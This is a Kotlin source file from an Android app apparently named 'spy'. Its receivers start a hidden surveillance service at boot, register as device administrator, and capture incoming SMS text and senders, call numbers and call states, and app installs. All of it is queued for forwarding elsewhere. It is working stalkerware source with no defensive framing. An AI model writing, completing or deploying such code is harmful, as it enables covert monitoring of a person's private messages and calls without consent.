package com.you.spy.receiver

import android.app.admin.DeviceAdminReceiver
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import com.you.spy.service.SpyService
import com.you.spy.util.Config
import com.you.spy.util.Queue

private fun start(ctx: Context) {
    if (!Config.connected) return
    val i = Intent(ctx, SpyService::class.java)
    runCatching { ContextCompat.startForegroundService(ctx, i) }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) = start(ctx)
}

class AdminReceiver : DeviceAdminReceiver()

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        if (intent?.action != "android.provider.Telephony.SMS_RECEIVED") return
        val msgs = android.telephony.SmsMessage.createFromPdu(
            intent.extras?.get("pdus")?.let { (it as Array<*>)[0] as ByteArray }
                ?: return, intent.extras?.getString("format")
        ) ?: return
        Queue.push("📩 <b>${msgs.originatingAddress}</b>\n${msgs.messageBody}")
    }
}

class CallReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        val state = intent?.getStringExtra(android.telephony.TelephonyManager.EXTRA_STATE)
        val num = intent?.getStringExtra(android.telephony.TelephonyManager.EXTRA_INCOMING_NUMBER)
        if (num.isNullOrBlank()) return
        when (state) {
            android.telephony.TelephonyManager.EXTRA_STATE_RINGING -> Queue.push("📞 incoming: $num")
            android.telephony.TelephonyManager.EXTRA_STATE_OFFHOOK -> Queue.push("📞 active: $num")
            android.telephony.TelephonyManager.EXTRA_STATE_IDLE -> Queue.push("📞 ended: $num")
        }
    }
}

class PackageReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        val pkg = intent?.data?.schemeSpecificPart ?: return
        if (pkg == ctx.packageName) return
        val action = if (Build.VERSION.SDK_INT >= 33)
            intent.action else intent.action
        val verb = when (action) {
            Intent.ACTION_PACKAGE_ADDED -> "installed"
            Intent.ACTION_PACKAGE_REMOVED -> "removed"
            else -> return
        }
        Queue.push("📦 $verb: $pkg")
    }
}
